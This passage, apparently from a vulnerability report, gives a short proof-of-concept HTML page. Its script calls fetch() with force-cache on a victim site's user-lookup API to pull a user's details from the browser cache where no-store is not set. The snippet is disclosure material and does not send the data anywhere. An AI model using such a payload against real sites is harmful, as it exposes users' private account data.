Then this POC can be used to fetch data from victims cache

<html>
<script>  
var url = "https://victimsite/_/api/1.0/user/lookup.json?username={victim_USERNAME}";  
fetch(url, {    
    method: 'GET',    
    cache: 'force-cache'
    });
</script>
</html>

#This might fetch all his details from Cache if Cache no-store is not implemented.
